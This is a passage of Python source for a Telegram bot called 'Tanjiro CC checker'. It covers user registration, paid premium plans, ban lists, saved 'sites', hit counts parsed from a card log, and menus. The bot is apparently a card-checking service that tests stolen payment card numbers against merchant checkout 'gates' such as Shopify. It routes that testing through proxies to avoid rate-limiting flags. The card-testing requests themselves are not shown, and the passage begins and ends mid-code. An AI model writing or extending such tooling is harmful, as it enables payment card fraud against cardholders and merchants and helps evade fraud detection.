    status = str(result.get("Status", ""))
    combined = f"{response} {status}"
    return is_retryable_card_response(combined) or any(k in combined.lower() for k in ["exception:", "invalid json", "no proxy found", "unknown error"])

def make_text_file_stream(filename, title, items):
    stream = io.BytesIO()
    data = f"{title}\n\n" + "\n".join(items)
    stream.write(data.encode("utf-8"))
    stream.seek(0)
    stream.name = filename
    return stream

async def update_site_retry_metadata(user_id, site, retry_count, last_error):
    if not user_id or not site:
        return
    sites_db = await load_json(SITE_FILE)
    user_key = str(user_id)
    user_sites = sites_db.get(user_key, [])
    target_key = site_dedupe_key(site)
    updated = False
    formatted_sites = []
    for item in user_sites:
        item_key = site_dedupe_key(item)
        if isinstance(item, str):
            entry = {"url": item}
        else:
            entry = dict(item)
        if target_key and item_key == target_key:
            entry["retry_count"] = retry_count
            entry["last_error"] = normalize_retry_reason(last_error)
            updated = True
        formatted_sites.append(entry)
    if updated:
        sites_db[user_key] = formatted_sites
        await save_json(SITE_FILE, sites_db)

async def remove_bug_site_from_database(user_id, site_url):
    """Permanently remove a flagged bug site from the user's saved site database."""
    sites_data = await load_json(SITE_FILE)
    user_key = str(user_id)
    user_sites = sites_data.get(user_key, [])
    target_key = site_dedupe_key(site_url)
    if not target_key or not user_sites:
        return False
    new_user_sites = [item for item in user_sites if site_dedupe_key(item) != target_key]
    if len(new_user_sites) == len(user_sites):
        return False
    sites_data[user_key] = new_user_sites
    await save_json(SITE_FILE, sites_data)
    return True

def attach_site_to_result(result, site):
    if not isinstance(result, dict):
        return result
    enriched = dict(result)
    enriched["Site"] = site
    return enriched

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

async def is_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    user_data = premium_users.get(str(user_id))
    if not user_data: return False
    expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
    current_date = datetime.datetime.now()
    if current_date > expiry_date:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return False
    return True

async def add_premium_user(user_id, days):
    premium_users = await load_json(PREMIUM_FILE)
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    premium_users[str(user_id)] = {
        'expiry': expiry_date.isoformat(),
        'added_by': 'admin',
        'days': days
    }
    await save_json(PREMIUM_FILE, premium_users)

async def remove_premium_user(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    if str(user_id) in premium_users:
        del premium_users[str(user_id)]
        await save_json(PREMIUM_FILE, premium_users)
        return True
    return False

async def is_banned_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    return str(user_id) in banned_users

async def ban_user(user_id, banned_by):
    banned_users = await load_json(BANNED_FILE)
    banned_users[str(user_id)] = {
        'banned_at': datetime.datetime.now().isoformat(),
        'banned_by': banned_by
    }
    await save_json(BANNED_FILE, banned_users)

async def unban_user(user_id):
    banned_users = await load_json(BANNED_FILE)
    if str(user_id) in banned_users:
        del banned_users[str(user_id)]
        await save_json(BANNED_FILE, banned_users)
        return True
    return False

# --- REGISTRATION DATABASE HANDLER ---
async def register_user(user_id, username, first_name):
    """Register a user in the database. Returns True if registered, False if already exists."""
    registration_db = await load_json(REGISTRATION_DB)
    user_key = str(user_id)
    
    if user_key in registration_db:
        return False  # Already registered
    
    # Generate unique database ID
    db_id = f"DB_{int(time.time())}_{random.randint(1000, 9999)}"
    
    registration_db[user_key] = {
        "db_id": db_id,
        "telegram_user_id": user_id,
        "username": username or "N/A",
        "first_name": first_name or "N/A",
        "registered_at": datetime.datetime.now().isoformat()
    }
    
    await save_json(REGISTRATION_DB, registration_db)
    return True

async def get_user_registration(user_id):
    """Get user registration data. Returns None if not registered."""
    registration_db = await load_json(REGISTRATION_DB)
    return registration_db.get(str(user_id))

async def is_user_registered(user_id):
    """Check if user is registered."""
    registration_db = await load_json(REGISTRATION_DB)
    return str(user_id) in registration_db

PLAN_LABELS = {
    3: "TRIAL PLAN",
    7: "STARTER PLAN",
    15: "SILVER PLAN",
    30: "GOLD PLAN",
    90: "PLATINUM PLAN"
}

PLAN_PRICES = {
    3: 3,
    7: 5,
    15: 8,
    30: 15,
    90: 40
}
OWNER_CONTACT_URL = "https://t.me/IQ_Builder"
GROUP_FREE_URL = "https://t.me/+0EgyvdopAvszODQ8"
INFO_VIEW_CACHE = {}
PENDING_AUTH = {}

async def check_user_plan_expired(user_id):
    return not await is_premium_user(user_id)

async def get_premium_user_data(user_id):
    premium_users = await load_json(PREMIUM_FILE)
    return premium_users.get(str(user_id))

def resolve_plan_label(days):
    return PLAN_LABELS.get(days, f"{days} DAY PLAN")

async def lookup_user_id_by_username(username):
    cleaned = username.lstrip("@").lower()
    registration_db = await load_json(REGISTRATION_DB)
    for uid, data in registration_db.items():
        stored = (data.get("username") or "").lstrip("@").lower()
        if stored and stored == cleaned:
            return int(uid), data
    return None, None

# --- AIOGRAM SETUP ---
aiogram_bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
aiogram_storage = MemoryStorage()
aiogram_dp = Dispatcher(storage=aiogram_storage)
aiogram_router = Router()
aiogram_dp.include_router(aiogram_router)

class AuthFlow(StatesGroup):
    choose_plan = State()
    enter_user_id = State()
    awaiting_confirmation = State()

class KeyGenFlow(StatesGroup):
    choose_plan = State()       # State for selecting between TRIAL, STARTER, SILVER, GOLD, PLATINUM
    enter_amount = State()      # State for specifying how many keys to batch generate

class ProxyFlow(StatesGroup):
    enter_proxy = State()

class FeedbackFlow(StatesGroup):
    identity_preference = State()
    awaiting_media = State()
    awaiting_text = State()

def generate_invoice_number(target_user_id, days):
    stamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
    suffix = hashlib.md5(f"{target_user_id}{days}{stamp}".encode()).hexdigest()[:6].upper()
    return f"INV-{stamp}-{suffix}"

async def resolve_info_target(sender_id, args=None, fallback_name="User"):
    user_hits_data, id_to_name_map, _, _, _ = await parse_cc_log()

    if not args:
        uid_to_query = sender_id
        user_name = fallback_name or id_to_name_map.get(str(sender_id), "User")
        reg_data = await get_user_registration(sender_id)
        if reg_data:
            user_name = reg_data.get("first_name") or user_name
        return uid_to_query, user_name, None

    if sender_id not in ADMIN_IDS:
        return None, None, "You are not authorized to look up other profiles."

    target_user = args.strip()
    if target_user.isdigit():
        uid_to_query = int(target_user)
        reg_data = await get_user_registration(uid_to_query)
        user_name = (reg_data.get("first_name") if reg_data else None) or id_to_name_map.get(str(uid_to_query), f"User {uid_to_query}")
        return uid_to_query, user_name, None

    cleaned_username = target_user.replace("@", "")
    uid_to_query, reg_data = await lookup_user_id_by_username(cleaned_username)
    if uid_to_query is None:
        return None, None, f"User @{cleaned_username} not found in registration database."
    return uid_to_query, f"@{cleaned_username}", None

async def build_info_dashboard(uid_to_query, user_name):
    user_hits_data, _, _, _, _ = await parse_cc_log()
    sites = await load_json(SITE_FILE)
    uid_str = str(uid_to_query)
    total_hits = user_hits_data.get(uid_str, {}).get("total", 0)
    saved_sites_count = len(sites.get(uid_str, []))

    premium_data = await get_premium_user_data(uid_to_query)
    is_premium = premium_data is not None and await is_premium_user(uid_to_query)

    if is_premium:
        status_label = "Premium User"
        plan_type = resolve_plan_label(premium_data.get("days", 0))
        expiry_raw = premium_data.get("expiry", "")
        expiry_date_str = expiry_raw[:10] if expiry_raw else ""
    else:
        status_label = "Free / Expired"
        plan_type = "None"
        expiry_date_str = ""

    if is_premium and expiry_date_str:
        try:
            expiry_date = datetime.datetime.strptime(expiry_date_str, "%Y-%m-%d")
            remaining_days = (expiry_date - datetime.datetime.now()).days
            if remaining_days > 0:
                time_left_str = f"{remaining_days} Days remaining"
            else:
                time_left_str = "Expired"
                status_label = "Free / Expired"
                plan_type = "None"
        except Exception:
            time_left_str = "Lifetime / Unlimited"
    elif is_premium:
        time_left_str = "Lifetime / Unlimited"
    else:
        time_left_str = "No active plan"

    info_text = (
        f"{premium_emoji('💎')} <b>𝖴𝖲𝖤𝖱 𝖣𝖠𝖲𝖧𝖡𝖮𝖠𝖱𝖣</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{premium_emoji('🚀')} <b>Account Metrics:</b>\n"
        f"⇾ Name <b>::</b> <code>{user_name}</code>\n"
        f"⇾ ID <b>::</b> <code>{uid_to_query}</code>\n"
        f"⇾ Total Hits <b>::</b> {premium_emoji('🔥')} <code>{total_hits}</code>\n"
        f"⇾ Status <b>::</b> {premium_emoji('✅')} <code>{status_label}</code>\n\n"
        f"{premium_emoji('📦')} <b>Subscription Info:</b>\n"
        f"⇾ Plan Type <b>::</b> <code>{plan_type}</code>\n"
        f"⇾ Time Left <b>::</b> <code>{time_left_str}</code>\n\n"
        f"{premium_emoji('📁')} <b>Saved Database:</b>\n"
        f"⇾ Active Sites <b>::</b> <code>({saved_sites_count}) Saved Pool</code>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji('💡')} <i>Tap the button below to view premium access plans!</i>"
    )
    return info_text

def build_info_keyboard():
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="View Plans",
            callback_data="view_plans",
            icon_custom_emoji_id=PREMIUM_EMOJI_IDS["🚀"],
            style="primary"
        )
    )
    return builder.as_markup()

def build_plans_keyboard():
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="Contact Owner to Buy",
            url=OWNER_CONTACT_URL,
            icon_custom_emoji_id=PREMIUM_EMOJI_IDS["💰"],
            style="success"
        )
    )
    builder.row(
        InlineKeyboardButton(
            text="Back to Dashboard",
            callback_data="info_back",
            icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
            style="primary"
        )
    )
    return builder.as_markup()

def build_auth_plan_keyboard():
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    for days, price in PLAN_PRICES.items():
        label = resolve_plan_label(days)
        builder.row(
            InlineKeyboardButton(
                text=f"{label} — {days}d / ${price}",
                callback_data=f"auth_plan_{days}",
                icon_custom_emoji_id=PREMIUM_EMOJI_IDS["🪙"],
                style="primary"
            )
        )
    builder.row(
        InlineKeyboardButton(
            text="Cancel Authorization",
            callback_data="auth_cancel",
            icon_custom_emoji_id=PREMIUM_EMOJI_IDS["❌"],
            style="danger"
        )
    )
    return builder.as_markup()

def build_auth_confirm_keyboard(invoice_no):
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="Confirm Authorization",
            callback_data=f"auth_confirm_{invoice_no}",
            icon_custom_emoji_id=PREMIUM_EMOJI_IDS["✅"],
            style="success"
        ),
        InlineKeyboardButton(
            text="Cancel",
            callback_data=f"auth_cancel_{invoice_no}",
            icon_custom_emoji_id=PREMIUM_EMOJI_IDS["❌"],
            style="danger"
        )
    )
    return builder.as_markup()

async def build_auth_summary_card(invoice_no, target_user_id, days, admin_id, admin_name):
    reg_data = await get_user_registration(target_user_id)
    plan_label = resolve_plan_label(days)
    price = PLAN_PRICES.get(days, "N/A")
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    expiry_str = expiry_date.strftime("%Y-%m-%d")

    username = reg_data.get("username", "N/A") if reg_data else "N/A"
    first_name = reg_data.get("first_name", "N/A") if reg_data else "N/A"
    db_id = reg_data.get("db_id", "Not Registered") if reg_data else "Not Registered"
    registered_at = reg_data.get("registered_at", "N/A")[:10] if reg_data else "N/A"

    card = (
        f"{premium_emoji('🔐')} <b>𝖠𝖣𝖬𝖨𝖭 𝖠𝖴𝖳𝖧𝖮𝖱𝖨Z𝖠𝖳𝖨𝖮𝖭 𝖢𝖠𝖱𝖣</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{premium_emoji('🧾')} <b>Invoice:</b> <code>{invoice_no}</code>\n"
        f"{premium_emoji('🆔')} <b>Target User ID:</b> <code>{target_user_id}</code>\n"
        f"{premium_emoji('👽')} <b>Username:</b> <code>@{username}</code>\n"
        f"{premium_emoji('🙂')} <b>Name:</b> <code>{first_name}</code>\n"
        f"{premium_emoji('📝')} <b>Database ID:</b> <code>{db_id}</code>\n"
        f"{premium_emoji('📋')} <b>Registered:</b> <code>{registered_at}</code>\n\n"
        f"{premium_emoji('📦')} <b>Plan:</b> <code>{plan_label}</code>\n"
        f"{premium_emoji('⌛')} <b>Duration:</b> <code>{days} Days</code>\n"
        f"{premium_emoji('💵')} <b>Price:</b> <code>${price}</code>\n"
        f"{premium_emoji('📊')} <b>Expiry Date:</b> <code>{expiry_str}</code>\n\n"
        f"{premium_emoji('👑')} <b>Initiated By:</b> <code>{admin_name}</code> (<code>{admin_id}</code>)\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji('⚠️')} <i>Awaiting owner confirmation to authorize premium access.</i>"
    )
    return card, expiry_str

async def build_auth_success_summary(invoice_no, target_user_id, days, expiry_str, plan_label, price):
    return (
        f"{premium_emoji('✅')} <b>𝖠𝖴𝖳𝖧𝖮𝖱𝖨Z𝖠𝖳𝖨𝖮𝖭 𝖢𝖮𝖬𝖯𝖫𝖤𝖳𝖤</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{premium_emoji('🧾')} <b>Invoice:</b> <code>{invoice_no}</code>\n"
        f"{premium_emoji('🆔')} <b>User ID:</b> <code>{target_user_id}</code>\n"
        f"{premium_emoji('📦')} <b>Plan:</b> <code>{plan_label}</code>\n"
        f"{premium_emoji('⌛')} <b>Duration:</b> <code>{days} Days</code>\n"
        f"{premium_emoji('💵')} <b>Price:</b> <code>${price}</code>\n"
        f"{premium_emoji('📊')} <b>Valid Until:</b> <code>{expiry_str}</code>\n\n"
        f"{premium_emoji('🚀')} <i>Premium access is now active.</i>"
    )

async def build_user_auth_notification(days, plan_label, expiry_str, invoice_no):
    return (
        f"{premium_emoji('💎')} <b>𝘾𝙤𝙣𝙜𝙧𝙖𝙩𝙪𝙡𝙖𝙩𝙞𝙤𝙣𝙨!</b>\n\n"
        f"{premium_emoji('✅')} <b>Your purchase was successful.</b>\n\n"
        f"{premium_emoji('📦')} <b>Plan:</b> <code>{plan_label}</code>\n"
        f"{premium_emoji('⌛')} <b>Duration:</b> <code>{days} Days</code>\n"
        f"{premium_emoji('📊')} <b>Valid Until:</b> <code>{expiry_str}</code>\n"
        f"{premium_emoji('🧾')} <b>Invoice:</b> <code>{invoice_no}</code>\n\n"
        f"{premium_emoji('🚀')} <i>You can now use the bot in private chat with full premium limits!</i>"
    )

def build_subscription_gate_text(reason_note=""):
    notice = ""
    if reason_note == "unregistered":
        notice = f"{premium_emoji('⚠️')} <b>𝖭𝖮𝖳𝖨𝖢𝖤:</b> <code>Registration required before using premium gates.</code>\n\n"
    elif reason_note == "expired":
        notice = f"{premium_emoji('⚠️')} <b>𝖭𝖮𝖳𝖨𝖢𝖤:</b> <code>Your premium subscription has expired.</code>\n\n"

    return (
        f"{notice}"
        f"{premium_emoji('🔐')} <b>𝖯𝖱𝖤𝖬𝖨𝖴𝖬 𝖦𝖠𝖳𝖤 𝖠𝖢𝖢𝖤𝖲𝖲</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{premium_emoji('🌐')} <b>Free Access:</b>\n"
        f"⇾ Use the bot for free in our official group with limited daily checks.\n\n"
        f"{premium_emoji('💎')} <b>Private Access:</b>\n"
        f"⇾ Upgrade your plan for unlimited private chat checking with full premium limits.\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji('💡')} <i>Choose an option below to continue.</i>"
    )

def build_subscription_gate_keyboard():
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="Use In Group Free",
            url=GROUP_FREE_URL,
            icon_custom_emoji_id=PREMIUM_EMOJI_IDS["🌐"],
            style="primary"
        )
    )
    builder.row(
        InlineKeyboardButton(
            text="View Premium Plans",
            callback_data="view_plans",
            icon_custom_emoji_id=PREMIUM_EMOJI_IDS["🚀"],
            style="success"
        )
    )
    return builder.as_markup()

def build_shopify_proxy_panel_text():
    return (
        f"{premium_emoji('⚠️')} <b>𝖲𝖧𝖮𝖯𝖨𝖥𝖸 𝖯𝖱𝖮𝖷𝖸 𝖱𝖤𝖰𝖴𝖨𝖱𝖤𝖣</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{premium_emoji('🛠')} <b>Endpoint Protection:</b>\n"
        f"⇾ Shopify checking endpoints strictly require an active proxy layer.\n"
        f"⇾ This prevents request rate-limiting flags on your session.\n\n"
        f"{premium_emoji('⚙️')} <b>Setup Required:</b>\n"
        f"⇾ Configure your active proxy before running <code>/sh</code> or <code>/msh</code>.\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{premium_emoji('💡')} <i>Tap below to set your active proxy.</i>"
    )

def build_shopify_proxy_keyboard():
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="Set Active Proxy",
            callback_data="set_user_proxy",
            icon_custom_emoji_id=PREMIUM_EMOJI_IDS["⚙️"],
            style="primary"
        )
    )
    return builder.as_markup()

async def send_gate_panel(chat_id, text, reply_markup):
    await aiogram_bot.send_message(
        chat_id,
        premium_emoji(text) if "<tg-emoji" not in text else text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

# --- INLINE KEYBOARD BUILDER ---
def build_custom_keyboard(markup_dict):
    """
    Convert custom keyboard dictionary to aiogram InlineKeyboardMarkup using InlineKeyboardBuilder.
    
    This function processes a custom markup format that includes:
    - text: Button label text
    - callback_data: Callback data for inline buttons
    - url: URL for URL buttons (optional)
    - icon_custom_emoji_id: Premium emoji ID for button
    - style: Visual style (success, danger, primary, default)
    
    Args:
        markup_dict (dict): Custom markup dictionary with inline_keyboard structure
        
    Returns:
        InlineKeyboardMarkup: aiogram InlineKeyboardMarkup object
    """
    if not markup_dict or "inline_keyboard" not in markup_dict:
        return InlineKeyboardMarkup(inline_keyboard=[])
    
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    
    builder = InlineKeyboardBuilder()
    
    for row in markup_dict["inline_keyboard"]:
        row_buttons = []
        
        for button in row:
            if not button or not isinstance(button, dict):
                continue
            
            # Extract button properties
            text = button.get("text", "")
            callback_data = button.get("callback_data")
            url = button.get("url")
            icon_emoji_id = button.get("icon_custom_emoji_id")
            style = button.get("style", "default")
            
            # Build button using InlineKeyboardBuilder pattern
            if callback_data:
                row_buttons.append(InlineKeyboardButton(
                    text=text,
                    callback_data=callback_data,
                    icon_custom_emoji_id=icon_emoji_id,
                    style=style
                ))
            elif url:
                row_buttons.append(InlineKeyboardButton(
                    text=text,
                    url=url,
                    icon_custom_emoji_id=icon_emoji_id,
                    style=style
                ))
        
        if row_buttons:
            builder.row(*row_buttons)
    
    return builder.as_markup()

# --- AIOGRAM COMMAND HANDLERS ---

@aiogram_router.message(Command("start"))
async def aiogram_start_handler(message: Message):
    """Handle /start command - display main menu with animation and inline buttons."""
    log_info("SYSTEM", f"Received /start command from user {message.from_user.id}")
    
    user_id = message.from_user.id
    username = message.from_user.username or "N/A"
    first_name = message.from_user.first_name or "N/A"
    
    # Check for start parameter (e.g., /start view_plan)
    args = message.text.split()
    if len(args) > 1 and args[1] == "view_plan":
        # Trigger view_plans callback
        from aiogram.types import CallbackQuery
        from aiogram.utils.keyboard import InlineKeyboardBuilder
        plans_text, _ = get_buy_panel_text(include_contact_link=False)
        await message.answer(
            plans_text,
            reply_markup=build_plans_keyboard(),
            parse_mode="HTML"
        )
        return
    
    # Auto-register user
    await register_user(user_id, username, first_name)
    
    # Check registration status
    is_registered = await is_user_registered(user_id)
    status = premium_emoji("Registered ✅") if is_registered else premium_emoji("Not Registered ❌")
    
    # Build premium text with <tg-emoji> tags and personalized profile link
    full_name = message.from_user.full_name or "User"
    text = (
        f"Sup <a href='tg://user?id={user_id}'>{full_name}</a>,\n"
        f"<b>Welcome to Tanjiro CC checker</b>\n\n"
        f"<tg-emoji emoji-id='{PREMIUM_EMOJI_IDS['🆔']}'>🆔</tg-emoji> User ID: <code>{user_id}</code>\n"
        f"<tg-emoji emoji-id='{PREMIUM_EMOJI_IDS['👽']}'>👽</tg-emoji> Account Status: {status}\n"
        f"<tg-emoji emoji-id='{PREMIUM_EMOJI_IDS['👾']}'>👾</tg-emoji> Bot Version: 3.0\n\n"
        f"Choose an option below to get started."
    )
    
    # Build welcome menu using InlineKeyboardBuilder with 2x2+1 grid
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    
    builder = InlineKeyboardBuilder()
    
    # Row 1: Gates, Commands
    builder.row(
        InlineKeyboardButton(
            text="Gates",
            callback_data="menu_gates",
            icon_custom_emoji_id=CUSTOM_EMOJI["GATES"],
            style="primary"
        ),
        InlineKeyboardButton(
            text="Commands",
            callback_data="menu_commands",
            icon_custom_emoji_id=CUSTOM_EMOJI["COMMANDS"],
            style="primary"
        )
    )
    
    # Row 2: Update (URL), Register
    builder.row(
        InlineKeyboardButton(
            text="Update",
            url=UPDATES_CHANNEL_URL,
            icon_custom_emoji_id=CUSTOM_EMOJI["UPDATE"],
            style="primary"
        ),
        InlineKeyboardButton(
            text="Register",
            callback_data="menu_register",
            icon_custom_emoji_id=CUSTOM_EMOJI["REGISTER"],
            style="success"
        )
    )
    
    # Row 3: Close Menu (centered)
    builder.row(
        InlineKeyboardButton(
            text="Close",
            callback_data="close_menu",
            icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
            style="danger"
        )
    )
    
    builder.adjust(2, 2, 1)
    
    # Send animation with random GIF
    random_gif = random.choice(WELCOME_GIFS)
    await message.answer_animation(
        animation=random_gif,
        caption=text,
        reply_markup=builder.as_markup(),
        parse_mode="HTML"
    )
    log_info("SYSTEM", f"Sent welcome menu to user {message.from_user.id}")

@aiogram_router.message(Command("register"))
async def aiogram_register_handler(message: Message):
    """Handle /register command - display registration status."""
    user_id = message.from_user.id
    username = message.from_user.username or "N/A"
    first_name = message.from_user.first_name or "N/A"
    
    # Check if already registered
    is_registered = await is_user_registered(user_id)
    
    if is_registered:
        # Get user data
        user_data = await get_user_registration(user_id)
        
        status_text = premium_emoji("✅ <b>You are already registered</b>\n\n")
        status_text += "━━━━━━━━━━━━━━━━━━\n"
        status_text += f"{premium_emoji('🔥')} <b>Status:</b> <code>Registered</code>\n"
        status_text += f"{premium_emoji('📝')} <b>Database ID:</b> <code>{user_data['db_id']}</code>\n"
        status_text += f"{premium_emoji('🆔')} <b>User ID:</b> <code>{user_data['telegram_user_id']}</code>\n"
        status_text += f"{premium_emoji('👽')} <b>Username:</b> <code>{user_data['username']}</code>\n"
        status_text += f"{premium_emoji('🙂')} <b>First Name:</b> <code>{user_data['first_name']}</code>\n"
        status_text += "━━━━━━━━━━━━━━━━━━"
        
        # Back to main menu button using InlineKeyboardBuilder
        from aiogram.utils.keyboard import InlineKeyboardBuilder
        builder = InlineKeyboardBuilder()
        builder.row(InlineKeyboardButton(
            text="Back to Menu",
            callback_data="menu_start",
            icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
            style="danger"
        ))
        
        await message.answer(status_text, reply_markup=builder.as_markup())
    else:
        # Register the user
        success = await register_user(user_id, username, first_name)
        
        if success:
            user_data = await get_user_registration(user_id)
            
            success_text = premium_emoji("✅ <b>Registration Successful!</b>\n\n")
            success_text += "━━━━━━━━━━━━━━━━━━\n"
            success_text += f"{premium_emoji('🔥')} <b>Status:</b> <code>Registered</code>\n"
            success_text += f"{premium_emoji('📝')} <b>Database ID:</b> <code>{user_data['db_id']}</code>\n"
            success_text += f"{premium_emoji('🆔')} <b>User ID:</b> <code>{user_data['telegram_user_id']}</code>\n"
            success_text += f"{premium_emoji('👽')} <b>Username:</b> <code>{user_data['username']}</code>\n"
            success_text += f"{premium_emoji('🙂')} <b>First Name:</b> <code>{user_data['first_name']}</code>\n"
            success_text += "━━━━━━━━━━━━━━━━━━"
            
            from aiogram.utils.keyboard import InlineKeyboardBuilder
            builder = InlineKeyboardBuilder()
            builder.row(InlineKeyboardButton(
                text="Back to Menu",
                callback_data="menu_start",
                icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
                style="danger"
            ))
            
            await message.answer(success_text, reply_markup=builder.as_markup())
        else:
            error_text = premium_emoji("❌ <b>Registration Failed</b>\n\n")
            error_text += "An error occurred during registration. Please try again."
            await message.answer(error_text)

# --- AIOGRAM CALLBACK HANDLERS ---

@aiogram_router.callback_query(F.data == "menu_start")
async def callback_menu_start(callback: CallbackQuery):
    """Handle callback to return to main menu - preserve current GIF."""
    from aiogram.types import InputMediaAnimation
    
    # Get current GIF file_id to preserve it
    current_gif_id = callback.message.animation.file_id
    
    user_id = callback.from_user.id
    is_registered = await is_user_registered(user_id)
    status = premium_emoji("Registered ✅") if is_registered else premium_emoji("Not Registered ❌")
    
    # Build premium text with <tg-emoji> tags and personalized profile link
    full_name = callback.from_user.full_name or "User"
    text = (
        f"Sup <a href='tg://user?id={user_id}'>{full_name}</a>,\n"
        f"Welcome to Tanjiro CC checker\n\n"
        f"<tg-emoji emoji-id='{PREMIUM_EMOJI_IDS['🆔']}'>🆔</tg-emoji> User ID: {user_id}\n"
        f"<tg-emoji emoji-id='{PREMIUM_EMOJI_IDS['👽']}'>👽</tg-emoji> Account Status: {status}\n"
        f"<tg-emoji emoji-id='{PREMIUM_EMOJI_IDS['👾']}'>👾</tg-emoji> Bot Version: 3.0\n\n"
        f"Choose an option below to get started."
    )
    
    # Build keyboard with 2x2 grid + 1 close button
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    
    builder.row(
        InlineKeyboardButton(
            text="Gates",
            callback_data="menu_gates",
            icon_custom_emoji_id=CUSTOM_EMOJI["GATES"],
            style="primary"
        ),
        InlineKeyboardButton(
            text="Commands",
            callback_data="menu_commands",
            icon_custom_emoji_id=CUSTOM_EMOJI["COMMANDS"],
            style="primary"
        )
    )
    
    builder.row(
        InlineKeyboardButton(
            text="Update",
            url=UPDATES_CHANNEL_URL,
            icon_custom_emoji_id=CUSTOM_EMOJI["UPDATE"],
            style="primary"
        ),
        InlineKeyboardButton(
            text="Register",
            callback_data="menu_register",
            icon_custom_emoji_id=CUSTOM_EMOJI["REGISTER"],
            style="success"
        )
    )
    
    builder.row(
        InlineKeyboardButton(
            text="Close",
            callback_data="close_menu",
            icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
            style="danger"
        )
    )
    
    builder.adjust(2, 2, 1)
    
    # Edit media to preserve the same GIF
    await callback.message.edit_media(
        media=InputMediaAnimation(media=current_gif_id, caption=text, parse_mode="HTML"),
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@aiogram_router.callback_query(F.data == "menu_register")
async def callback_menu_register(callback: CallbackQuery):
    """Handle callback to register menu - preserve current GIF."""
    from aiogram.types import InputMediaAnimation
    
    # Get current GIF file_id to preserve it
    current_gif_id = callback.message.animation.file_id
    
    user_id = callback.from_user.id
    username = callback.from_user.username or "N/A"
    first_name = callback.from_user.first_name or "N/A"
    
    # Check if already registered
    is_registered = await is_user_registered(user_id)
    
    if is_registered:
        user_data = await get_user_registration(user_id)
        
        status_text = premium_emoji("✅ <b>You are already registered</b>\n\n")
        status_text += "━━━━━━━━━━━━━━━━━━\n"
        status_text += f"{premium_emoji('🔥')} <b>Status:</b> <code>Registered</code>\n"
        status_text += f"{premium_emoji('📝')} <b>Database ID:</b> <code>{user_data['db_id']}</code>\n"
        status_text += f"{premium_emoji('🆔')} <b>User ID:</b> <code>{user_data['telegram_user_id']}</code>\n"
        status_text += f"{premium_emoji('👽')} <b>Username:</b> <code>{user_data['username']}</code>\n"
        status_text += f"{premium_emoji('🙂')} <b>First Name:</b> <code>{user_data['first_name']}</code>\n"
        status_text += "━━━━━━━━━━━━━━━━━━"
    else:
        success = await register_user(user_id, username, first_name)
        
        if success:
            user_data = await get_user_registration(user_id)
            
            status_text = premium_emoji("✅ <b>Registration Successful!</b>\n\n")
            status_text += "━━━━━━━━━━━━━━━━━━\n"
            status_text += f"{premium_emoji('🔥')} <b>Status:</b> <code>Registered</code>\n"
            status_text += f"{premium_emoji('📝')} <b>Database ID:</b> <code>{user_data['db_id']}</code>\n"
            status_text += f"{premium_emoji('🆔')} <b>User ID:</b> <code>{user_data['telegram_user_id']}</code>\n"
            status_text += f"{premium_emoji('👽')} <b>Username:</b> <code>{user_data['username']}</code>\n"
            status_text += f"{premium_emoji('🙂')} <b>First Name:</b> <code>{user_data['first_name']}</code>\n"
            status_text += "━━━━━━━━━━━━━━━━━━"
        else:
            status_text = premium_emoji("❌ <b>Registration Failed</b>\n\n")
            status_text += "An error occurred during registration. Please try again."
    
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(
        text="Back to Menu",
        callback_data="menu_start",
        icon_custom_emoji_id=CUSTOM_EMOJI["BACK"],
        style="danger"
    ))
    
    # Edit media to preserve the same GIF
    await callback.message.edit_media(
        media=InputMediaAnimation(media=current_gif_id, caption=status_text, parse_mode="HTML"),
        reply_markup=builder.as_markup()
    )
    await callback.answer()

@aiogram_router.callback_query(F.data == "menu_commands")
async def callback_menu_commands(callback: CallbackQuery):
    """Handle callback to commands menu - preserve current GIF."""
    from aiogram.types import InputMediaAnimation
    
    # Get current GIF file_id to preserve it
    current_gif_id = callback.message.animation.file_id
    user_id = callback.from_user.id
    
    from aiogram.utils.keyboard import InlineKeyboardBuilder
    builder = InlineKeyboardBuilder()
